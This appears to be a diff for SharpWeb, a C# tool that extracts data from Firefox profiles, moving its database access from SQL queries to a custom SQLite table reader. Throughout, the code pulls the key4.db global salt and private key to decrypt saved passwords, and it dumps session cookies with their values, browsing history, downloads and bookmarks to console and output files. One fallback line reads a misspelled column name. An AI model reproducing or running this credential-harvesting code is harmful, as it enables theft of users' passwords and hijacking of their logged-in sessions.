@@ -11,7 +11,6 @@ using SharpWeb.Browsers.Firefox;
 using SharpWeb.Utilities;
 using static SharpWeb.Utilities.Current;
 using static SharpWeb.Display.OutputFormatting;
-using Community.CsharpSqlite.SQLiteClient;
 
 
 namespace SharpWeb.Browsers
@@ -148,19 +147,16 @@ namespace SharpWeb.Browsers
 
         public static byte[] dataToParse2(string userFireFoxdbPath_tempFile)
         {
-            SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", userFireFoxdbPath_tempFile));
-            con.Open();
-            SqliteCommand query = new SqliteCommand("SELECT a11,a102 FROM nssPrivate", con);
-            SqliteDataReader reader = query.ExecuteReader();
-
             byte[] a = null;
-            while (reader.Read())
+            SQLiteHandler sqlDatabase = new SQLiteHandler(userFireFoxdbPath_tempFile);
+            if (sqlDatabase.ReadTable("nssPrivate"))
             {
-                a = (byte[])(reader.GetValue(0));
+                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                {
+                    a = Convert.FromBase64String(sqlDatabase.GetValue(i, "a11"));
+                }
             }
-            con.Close();
             return a;
-
         }
 
         public static void Find_Password(string userFireFoxdbPath, string userFireFoxloginPath)
@@ -182,20 +178,25 @@ namespace SharpWeb.Browsers
                     string userFireFoxloginPath_tempFile = Path.GetTempFileName();
                     File.Copy(userFireFoxloginPath, userFireFoxloginPath_tempFile, true);
 
-                    SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", userFireFoxdbPath_tempFile));
-                    con.Open();
-                    SqliteCommand query = new SqliteCommand("SELECT item1, item2 FROM metadata WHERE id = 'password'", con);
-                    SqliteDataReader reader = query.ExecuteReader();
-
-
                     byte[] globalSalt = null, dataToParse = null;
-                    while (reader.Read())
-                    {
-                        globalSalt = (byte[])(reader.GetValue(0));
-                        dataToParse = (byte[])(reader.GetValue(1));
-                    }
-                    con.Close();
 
+                    SQLiteHandler sqlDatabase = new SQLiteHandler(userFireFoxdbPath_tempFile);
+                    if (sqlDatabase.ReadTable("metadata"))
+                    {
+                        for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                        {
+                            if (sqlDatabase.GetValue(i, "id") != "password") continue;
+                            globalSalt = Convert.FromBase64String(sqlDatabase.GetValue(i, "item1"));
+                            try
+                            {
+                                dataToParse = Convert.FromBase64String(sqlDatabase.GetValue(i, "item2"));
+                            }
+                            catch
+                            {
+                                dataToParse = Convert.FromBase64String(sqlDatabase.GetValue(i, "item2)"));
+                            }
+                        }
+                    }
                     Asn1DerObject asn = asn1Der.Parse(dataToParse);
                     byte[] array = FireFox.decryptPEB(asn, Encoding.ASCII.GetBytes(""), globalSalt);
 
@@ -254,8 +255,6 @@ namespace SharpWeb.Browsers
             {
                 string cookies_tempFile = CreateTmpFile(cookie_path);
 
-                string patchedcookieDB = PatchWALDatabase(cookies_tempFile);
-
                 string[] Jsonheader = new string[] { "domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value" };
                 List<string[]> Jsondata = new List<string[]> { };
 
@@ -264,38 +263,35 @@ namespace SharpWeb.Browsers
 
                 string fileName = Path.Combine("out", "FireFox_cookie");
 
-                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedcookieDB));
-                con.Open();
-                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
-                drop.ExecuteNonQuery();
-                SqliteCommand query = new SqliteCommand("SELECT name,value,host,path,creationTime,expiry,lastAccessed,isSecure,isHttpOnly,samesite FROM moz_cookies", con);
-                SqliteDataReader reader = query.ExecuteReader();
-                while (reader.Read())
+                SQLiteHandler sqlDatabase = new SQLiteHandler(cookies_tempFile);
+                if (sqlDatabase.ReadTable("moz_cookies"))
                 {
-                    PrintNorma("    ---------------------------------------------------------");
-                    string name = reader.GetValue(0).ToString();
-                    string value = reader.GetValue(1).ToString();
-                    string host = reader.GetValue(2).ToString();
-                    string path = reader.GetValue(3).ToString();
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        PrintNorma("    ---------------------------------------------------------");
+                        string name = sqlDatabase.GetValue(i, "name");
+                        string value = sqlDatabase.GetValue(i, "value");
+                        string host = sqlDatabase.GetValue(i, "host");
+                        string path = sqlDatabase.GetValue(i, "path");
 
-                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(4).ToString()) / 1000000).ToString();
-                    string accessTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(6).ToString()) / 1000000).ToString();
-                    string expiry = TypeUtil.TimeStamp(long.Parse(reader.GetValue(5).ToString())).ToString();
-                    string isSecure = is_true_false(reader.GetValue(7).ToString());
-                    string isHttpOnly = is_true_false(reader.GetValue(8).ToString());
-                    string sameSiteString = TryParsesameSite(reader.GetValue(9).ToString());
-                    string cookie = String.Format("{0}={1}", name, value);
+                        string creationTime = TypeUtil.TimeStamp(long.Parse(sqlDatabase.GetValue(i, "creationTime")) / 1000000).ToString();
+                        string accessTime = TypeUtil.TimeStamp(long.Parse(sqlDatabase.GetValue(i, "lastAccessed")) / 1000000).ToString();
+                        string expiry = TypeUtil.TimeStamp(long.Parse(sqlDatabase.GetValue(i, "expiry"))).ToString();
+                        string isSecure = is_true_false(sqlDatabase.GetValue(i, "isSecure"));
+                        string isHttpOnly = is_true_false(sqlDatabase.GetValue(i, "isHttpOnly"));
+                        string sameSiteString = TryParsesameSite(sqlDatabase.GetValue(i, "samesite"));
+                        string cookie = String.Format("{0}={1}", name, value);
 
-                    data.Add(new string[] { host, cookie, path, isSecure, isHttpOnly, creationTime, expiry });
-                    Jsondata.Add(new string[] { host, reader.GetValue(5).ToString(), "false", isHttpOnly, name, path, sameSiteString, isSecure, "true", "0", value });
+                        data.Add(new string[] { host, cookie, path, isSecure, isHttpOnly, creationTime, expiry });
+                        Jsondata.Add(new string[] { host, sqlDatabase.GetValue(i, "expiry"), "false", isHttpOnly, name, path, sameSiteString, isSecure, "true", "0", value });
 
-                    PrintSuccess(String.Format("HOST: {0}", host), 1);
-                    PrintSuccess(String.Format("COOKIE: {0}={1},path={2}", name, value, path), 1);
-                    PrintSuccess(String.Format("CreateDate: {0}", creationTime), 1);
-                    PrintSuccess(String.Format("ExpireDate: {0}", expiry), 1);
-                    PrintSuccess(String.Format("Path: {0}", path), 1);
+                        PrintSuccess(String.Format("HOST: {0}", host), 1);
+                        PrintSuccess(String.Format("COOKIE: {0}={1},path={2}", name, value, path), 1);
+                        PrintSuccess(String.Format("CreateDate: {0}", creationTime), 1);
+                        PrintSuccess(String.Format("ExpireDate: {0}", expiry), 1);
+                        PrintSuccess(String.Format("Path: {0}", path), 1);
+                    }
                 }
-                con.Close();
                 File.Delete(cookies_tempFile);
                 if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                     WriteJson(Jsonheader, Jsondata, fileName);
@@ -316,8 +312,6 @@ namespace SharpWeb.Browsers
             {
                 string places_tempFile = CreateTmpFile(places_path);
 
-                string patchedhistroyDB = PatchWALDatabase(places_tempFile);
-
                 PrintVerbose("Get Firefox Historys");
 
                 string[] header = new string[] { "URL", "TITLE", "TIME" };
@@ -325,27 +319,24 @@ namespace SharpWeb.Browsers
 
                 string fileName = Path.Combine("out", "FireFox_history");
 
-                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedhistroyDB));
-                con.Open();
-                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
-                drop.ExecuteNonQuery();
-
-                SqliteCommand query = new SqliteCommand("SELECT url, COALESCE(last_visit_date, 0), COALESCE(title, ''), visit_count FROM moz_places", con);
-
-                SqliteDataReader reader = query.ExecuteReader();
-
-                while (reader.Read())
+                SQLiteHandler sqlDatabase = new SQLiteHandler(places_tempFile);
+                if (sqlDatabase.ReadTable("moz_places"))
                 {
-                    string url = reader.GetValue(0).ToString();
-                    string title = reader.GetValue(2).ToString();
-                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(1).ToString()) / 1000000).ToString();
-                    PrintNorma("    ---------------------------------------------------------");
-                    PrintSuccess(String.Format("URL: {0}", url), 1);
-                    PrintSuccess(String.Format("TITLE: {0}", title), 1);
-                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
-                    data.Add(new string[] { url, title, creationTime });
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        string url = sqlDatabase.GetValue(i, "url");
+                        string title = sqlDatabase.GetValue(i, "title");
+                        if (title.Equals("0"))
+                            continue;
+                        string creationTime = TypeUtil.TimeStamp(long.Parse(sqlDatabase.GetValue(i, "last_visit_date")) / 1000000).ToString();
+                        PrintNorma("    ---------------------------------------------------------");
+                        PrintSuccess(String.Format("URL: {0}", url), 1);
+                        PrintSuccess(String.Format("TITLE: {0}", title), 1);
+                        PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
+                        data.Add(new string[] { url, title, creationTime });
+                    }
                 }
-                con.Close();
+
                 File.Delete(places_tempFile);
                 if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                     WriteJson(header, data, fileName);
@@ -365,8 +356,6 @@ namespace SharpWeb.Browsers
             {
                 string places_tempFile = CreateTmpFile(places_path);
 
-                string patcheddownloadDB = PatchWALDatabase(places_tempFile);
-
                 PrintVerbose("Get Firefox Downloads");
 
                 string[] header = new string[] { "URL", "PATH", "TIME" };
@@ -374,24 +363,46 @@ namespace SharpWeb.Browsers
 
                 string fileName = Path.Combine("out", "FireFox_download");
 
-                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patcheddownloadDB));
-                con.Open();
-                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
-                drop.ExecuteNonQuery();
-                SqliteCommand query = new SqliteCommand("SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id", con);
-                SqliteDataReader reader = query.ExecuteReader();
-                while (reader.Read())
+                Dictionary<string, string> Paths = new Dictionary<string, string>();
+                Dictionary<string, string> Times = new Dictionary<string, string>();
+
+                SQLiteHandler sqlDatabase = new SQLiteHandler(places_tempFile);
+                if (sqlDatabase.ReadTable("moz_annos"))
                 {
-                    string path = reader.GetValue(0).ToString();
-                    string url = reader.GetValue(1).ToString();
-                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(2).ToString()) / 1000000).ToString();
-                    PrintNorma("    ---------------------------------------------------------");
-                    PrintSuccess(String.Format("URL: {0}", url), 1);
-                    PrintSuccess(String.Format("PATH: {0}", path), 1);
-                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
-                    data.Add(new string[] { url, path, creationTime });
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        string place_id = sqlDatabase.GetValue(i, "place_id");
+                        string path = sqlDatabase.GetValue(i, "content");
+                        if (!path.StartsWith("file:///"))
+                            continue;
+                        string creationTime = TypeUtil.TimeStamp(long.Parse(sqlDatabase.GetValue(i, "dateAdded")) / 1000000).ToString();
+                        Paths.Add(place_id, path);
+                        Times.Add(place_id, creationTime);
+                    }
                 }
-                con.Close();
+
+                sqlDatabase = new SQLiteHandler(places_tempFile);
+                if (sqlDatabase.ReadTable("moz_places"))
+                {
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        var id = Convert.ToString(sqlDatabase.GetRawID(i));
+
+                        if (Paths.ContainsKey(id))
+                        {
+                            var url = sqlDatabase.GetValue(i, "url");
+                            var path = Paths[id];
+                            var creationTime = Times[id];
+                            PrintNorma("    ---------------------------------------------------------");
+                            PrintSuccess(String.Format("URL: {0}", url), 1);
+                            PrintSuccess(String.Format("PATH: {0}", path), 1);
+                            PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
+                            data.Add(new string[] { url, path, creationTime });
+
+                        }
+                    }
+                }
+
                 File.Delete(places_tempFile);
                 if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                     WriteJson(header, data, fileName);
@@ -412,34 +423,52 @@ namespace SharpWeb.Browsers
             {
                 string places_tempFile = CreateTmpFile(places_path);
 
-                string patchedbookmarksDB = PatchWALDatabase(places_tempFile);
-
                 PrintVerbose("Get Firefox Bookmarks");
 
-                string[] header = new string[] { "URL", "TITLE", "TIME" };
+                string[] header = new string[] { "URL", "TITLE" ,"TIME"};
                 List<string[]> data = new List<string[]> { };
 
                 string fileName = Path.Combine("out", "FireFox_bookmark");
 
-                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", patchedbookmarksDB));
-                con.Open();
-                SqliteCommand drop = new SqliteCommand("DROP TABLE IF EXISTS moz_previews_tombstones;", con);
-                drop.ExecuteNonQuery();
-                SqliteCommand query = new SqliteCommand("SELECT url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)", con);
-                SqliteDataReader reader = query.ExecuteReader();
-                while (reader.Read())
-                {
+                Dictionary<string, string> Titles = new Dictionary<string, string>();
+                Dictionary<string, string> Times = new Dictionary<string, string>();
 
-                    string url = reader.GetValue(0).ToString();
-                    string title = reader.GetValue(2).ToString();
-                    string creationTime = TypeUtil.TimeStamp(long.Parse(reader.GetValue(1).ToString()) / 1000000).ToString();
-                    PrintNorma("    ---------------------------------------------------------");
-                    PrintSuccess(String.Format("URL: {0}", url), 1);
-                    PrintSuccess(String.Format("TITLE: {0}", title), 1);
-                    PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
-                    data.Add(new string[] { url, title, creationTime });
+                SQLiteHandler sqlDatabase = new SQLiteHandler(places_tempFile);
+                if (sqlDatabase.ReadTable("moz_bookmarks"))
+                {
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        var fk = sqlDatabase.GetValue(i, "fk");
+                        var title = sqlDatabase.GetValue(i, "title");
+                        var time = sqlDatabase.GetValue(i, "dateAdded");
+                        if (fk != "0")
+                        {
+                            Titles.Add(fk, title);
+                            Times.Add(fk, time);
+                        }
+                    }
                 }
-                con.Close();
+
+                sqlDatabase = new SQLiteHandler(places_tempFile);
+                if (sqlDatabase.ReadTable("moz_places"))
+                {
+                    for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                    {
+                        var id = Convert.ToString(sqlDatabase.GetRawID(i));
+                        var url = sqlDatabase.GetValue(i, "url");
+
+                        if (Titles.ContainsKey(id))
+                        {
+                            string title = Titles[id];
+                            string creationTime = TypeUtil.TimeStamp(long.Parse(Times[id]) / 1000000).ToString();
+                            PrintNorma("    ---------------------------------------------------------");
+                            PrintSuccess(String.Format("URL: {0}", url), 1);
+                            PrintSuccess(String.Format("TITLE: {0}", title), 1);
+                            PrintSuccess(String.Format("TIME: {0}", creationTime), 1);
+                            data.Add(new string[] { url, title , creationTime });
+                        }
+                    }
+                }
                 File.Delete(places_tempFile);
                 if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                     WriteJson(header, data, fileName);
